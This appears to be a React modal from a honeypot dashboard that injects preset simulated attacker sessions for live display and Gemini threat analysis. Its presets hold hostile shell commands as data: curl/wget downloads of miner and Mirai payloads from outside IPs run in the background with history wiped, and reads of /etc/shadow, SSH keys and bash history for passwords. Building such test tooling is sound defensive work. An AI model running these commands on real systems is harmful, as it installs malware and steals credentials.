import { useState, useEffect } from 'react';
import { X, Play, ShieldAlert, Sparkles, CheckCircle2, AlertCircle } from 'lucide-react';
import { createSession, analyzeSession } from '../../api/sessions';
import { playSuccessChime, playAlertPing } from '../../lib/audio';

const ATTACK_PRESETS = [
  {
    id: 'recon',
    title: 'Reconnaissance & Enumeration',
    category: 'Discovery',
    ip: '185.220.101.45',
    country: 'Netherlands (Tor Exit Node)',
    protocol: 'ssh',
    description: 'Initial system discovery, kernel inspection, network topology scan and user permission checks.',
    commands: [
      'uname -a',
      'id',
      'cat /etc/issue',
      'cat /proc/cpuinfo | grep "model name" | head -n 2',
      'netstat -tulnp',
      'ip addr show',
      'ps aux | head -n 10',
    ],
  },
  {
    id: 'malware',
    title: 'Malware Dropper & Cryptominer',
    category: 'Malware Deployment',
    ip: '194.26.29.112',
    country: 'Russia (Bulletproof VPS)',
    protocol: 'ssh',
    description: 'Downloads malicious shell script stagers, changes execution permissions, executes hidden background miner, and wipes history.',
    commands: [
      'cd /tmp || cd /var/tmp',
      'curl -s -O http://194.26.29.112/miner.sh',
      'wget -q http://194.26.29.112/bot.sh -O .sys-daemon',
      'chmod +x miner.sh .sys-daemon',
      'nohup ./.sys-daemon >/dev/null 2>&1 &',
      'rm -rf miner.sh',
      'history -c',
    ],
  },
  {
    id: 'cred_theft',
    title: 'Credential Harvesting & PrivEsc',
    category: 'Credential Access',
    ip: '45.154.255.88',
    country: 'Seychelles',
    protocol: 'ssh',
    description: 'Attempts to read password hashes, inspect sudo permissions, look for SUID binaries, and exfiltrate bash history.',
    commands: [
      'cat /etc/passwd',
      'cat /etc/shadow 2>/dev/null',
      'sudo -l',
      'find / -perm -u=s -type f 2>/dev/null',
      'cat ~/.bash_history | grep -E "pass|secret|admin"',
      'cat ~/.ssh/authorized_keys 2>/dev/null',
      'crontab -l',
    ],
  },
  {
    id: 'mirai_iot',
    title: 'Mirai IoT Telnet Botnet',
    category: 'Execution',
    ip: '89.248.163.14',
    country: 'Germany',
    protocol: 'telnet',
    description: 'Typical automated brute force IoT scanner searching for BusyBox binaries and staging an ARM botnet payload.',
    commands: [
      'enable',
      'shell',
      'cat /bin/busybox',
      '/bin/busybox MIRAI',
      'wget http://89.248.163.14/bins/mirai.arm7 -O - > /tmp/arm',
      'chmod 777 /tmp/arm',
      '/tmp/arm honeypot.trigger',
    ],
  },
];

export default function AttackSimulatorModal({ isOpen, onClose, onSessionCreated }) {
  const [selectedPresetId, setSelectedPresetId] = useState('recon');
  const [ipAddress, setIpAddress] = useState(ATTACK_PRESETS[0].ip);
  const [protocol, setProtocol] = useState(ATTACK_PRESETS[0].protocol);
  const [commandsText, setCommandsText] = useState(ATTACK_PRESETS[0].commands.join('\n'));
  const [autoAnalyze, setAutoAnalyze] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState(null);
  const [successMsg, setSuccessMsg] = useState(null);

  // Switch preset
  const handleSelectPreset = (preset) => {
    setSelectedPresetId(preset.id);
    setIpAddress(preset.ip);
    setProtocol(preset.protocol);
    setCommandsText(preset.commands.join('\n'));
    setError(null);
    setSuccessMsg(null);
  };

  useEffect(() => {
    const handleKeyDown = (e) => {
      if (e.key === 'Escape' && isOpen) onClose();
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [isOpen, onClose]);

  if (!isOpen) return null;

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!ipAddress.trim()) {
      setError('Attacker IP address is required.');
      return;
    }

    const commandList = commandsText
      .split('\n')
      .map((c) => c.trim())
      .filter(Boolean);

    if (commandList.length === 0) {
      setError('At least one shell command is required.');
      return;
    }

    setSubmitting(true);
    setError(null);
    setSuccessMsg(null);

    try {
      playAlertPing();
      const res = await createSession({
        ip_address: ipAddress.trim(),
        protocol: protocol.toLowerCase(),
        commands: commandList,
      });

      const newSessionId = res?.session_id;
      setSuccessMsg(`Attack session #${newSessionId} launched! Emitted to live terminal.`);
      playSuccessChime();

      // Trigger Gemini AI classification if selected
      if (autoAnalyze && newSessionId) {
        try {
          await analyzeSession(newSessionId);
        } catch (aiErr) {
          console.warn('[Simulator] Auto-analysis failed:', aiErr.message);
        }
      }

      if (onSessionCreated && newSessionId) {
        onSessionCreated(newSessionId);
      }

      setTimeout(() => {
        onClose();
      }, 1200);
    } catch (err) {
      setError(err.message || 'Failed to trigger attack session.');
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/75 p-4 backdrop-blur-sm animate-in fade-in duration-200">
      <div className="relative w-full max-w-3xl rounded-xl border border-slate-700/80 bg-[#0B0F17] shadow-2xl shadow-emerald-950/30">
        {/* Header */}
        <div className="flex items-center justify-between border-b border-slate-800 px-6 py-4">
          <div className="flex items-center gap-2.5">
            <div className="flex h-8 w-8 items-center justify-center rounded-md border border-emerald-800/80 bg-emerald-950/60 text-emerald-400">
              <ShieldAlert size={18} />
            </div>
            <div>
              <h2 className="text-sm font-semibold uppercase tracking-wider text-slate-100">
                Honeypot Attack Simulator
              </h2>
              <p className="text-[11px] text-slate-400">
                Inject realistic threat activity directly into SentinelAI to test live terminal & AI analysis
              </p>
            </div>
          </div>
          <button
            type="button"
            onClick={onClose}
            className="rounded-md border border-slate-800 p-1.5 text-slate-400 hover:border-slate-700 hover:text-slate-200 transition-colors"
          >
            <X size={16} />
          </button>
        </div>

        {/* Form Body */}
        <form onSubmit={handleSubmit} className="p-6 space-y-5">
          {/* Preset Buttons */}
          <div>
            <label className="block text-[11px] font-semibold uppercase tracking-wider text-slate-400 mb-2">
              Select Threat Vector Preset:
            </label>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
              {ATTACK_PRESETS.map((preset) => (
                <button
                  key={preset.id}
                  type="button"
                  onClick={() => handleSelectPreset(preset)}
                  className={`flex flex-col text-left rounded-lg border p-3 transition-all ${
                    selectedPresetId === preset.id
                      ? 'border-emerald-700 bg-emerald-950/40 shadow-sm'
                      : 'border-slate-800 bg-slate-900/50 hover:border-slate-700'
                  }`}
                >
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-semibold text-slate-200">{preset.title}</span>
                    <span className="text-[9px] uppercase tracking-wider px-1.5 py-0.5 rounded bg-slate-800 text-slate-400 font-mono">
                      {preset.protocol.toUpperCase()}
                    </span>
                  </div>
                  <p className="mt-1 text-[11px] text-slate-400 line-clamp-2">{preset.description}</p>
                </button>
              ))}
            </div>
          </div>

          {/* Config Grid: IP & Protocol */}
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
            <div className="sm:col-span-2">
              <label className="block text-[10px] font-semibold uppercase tracking-wider text-slate-400 mb-1.5">
                Attacker IP Address
              </label>
              <input
                type="text"
                value={ipAddress}
                onChange={(e) => setIpAddress(e.target.value)}
                placeholder="e.g. 185.220.101.45"
                className="w-full rounded-md border border-slate-800 bg-slate-950/80 px-3 py-2 font-mono text-xs text-slate-200 focus:border-emerald-500 focus:outline-none"
              />
            </div>
            <div>
              <label className="block text-[10px] font-semibold uppercase tracking-wider text-slate-400 mb-1.5">
                Target Protocol
              </label>
              <select
                value={protocol}
                onChange={(e) => setProtocol(e.target.value)}
                className="w-full rounded-md border border-slate-800 bg-slate-950/80 px-3 py-2 font-mono text-xs text-slate-200 focus:border-emerald-500 focus:outline-none"
              >
                <option value="ssh">SSH (Port 2222/22)</option>
                <option value="telnet">Telnet (Port 2323/23)</option>
                <option value="http">HTTP (Port 80/8080)</option>
              </select>
            </div>
          </div>

          {/* Shell Commands Input */}
          <div>
            <div className="flex items-center justify-between mb-1.5">
              <label className="text-[10px] font-semibold uppercase tracking-wider text-slate-400">
                Injected Attacker Keystrokes / Commands (1 per line)
              </label>
              <span className="font-mono text-[10px] text-slate-500">
                {commandsText.split('\n').filter((c) => c.trim()).length} commands
              </span>
            </div>
            <textarea
              rows={5}
              value={commandsText}
              onChange={(e) => setCommandsText(e.target.value)}
              className="w-full rounded-md border border-slate-800 bg-black/80 p-3 font-mono text-xs leading-relaxed text-emerald-400 focus:border-emerald-500 focus:outline-none"
              placeholder="uname -a&#10;cat /etc/passwd&#10;wget http://evil.com/miner"
            />
          </div>

          {/* Auto-Analyze Checkbox */}
          <div className="flex items-center justify-between rounded-lg border border-violet-900/40 bg-violet-950/20 p-3">
            <div className="flex items-center gap-2">
              <Sparkles size={16} className="text-violet-400" />
              <div>
                <p className="text-xs font-medium text-violet-200">Automatically trigger Google Gemini AI analysis</p>
                <p className="text-[11px] text-violet-400/80">
                  Sends commands to Gemini AI engine immediately to generate threat summary & MITRE techniques
                </p>
              </div>
            </div>
            <input
              type="checkbox"
              checked={autoAnalyze}
              onChange={(e) => setAutoAnalyze(e.target.checked)}
              className="h-4 w-4 rounded border-slate-700 bg-slate-900 text-violet-500 focus:ring-0 cursor-pointer"
            />
          </div>

          {/* Status / Errors */}
          {error && (
            <div className="flex items-center gap-2 rounded-md border border-rose-900/80 bg-rose-950/40 p-3 text-xs text-rose-300">
              <AlertCircle size={15} />
              <span>{error}</span>
            </div>
          )}

          {successMsg && (
            <div className="flex items-center gap-2 rounded-md border border-emerald-900/80 bg-emerald-950/50 p-3 text-xs text-emerald-300">
              <CheckCircle2 size={15} />
              <span>{successMsg}</span>
            </div>
          )}

          {/* Action Buttons */}
          <div className="flex items-center justify-end gap-3 border-t border-slate-800 pt-4">
            <button
              type="button"
              onClick={onClose}
              className="rounded-md border border-slate-800 px-4 py-2 text-xs font-medium text-slate-400 hover:border-slate-700 hover:text-slate-200 transition-colors"
            >
              Cancel
            </button>
            <button
              type="submit"
              disabled={submitting}
              className="flex items-center gap-2 rounded-md border border-emerald-700 bg-emerald-900/80 px-5 py-2 text-xs font-semibold uppercase tracking-wider text-emerald-100 hover:bg-emerald-800 transition-colors disabled:opacity-50 glow-emerald"
            >
              <Play size={13} className="fill-emerald-300" />
              <span>{submitting ? 'Launching Vector…' : 'Launch Simulated Attack'}</span>
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
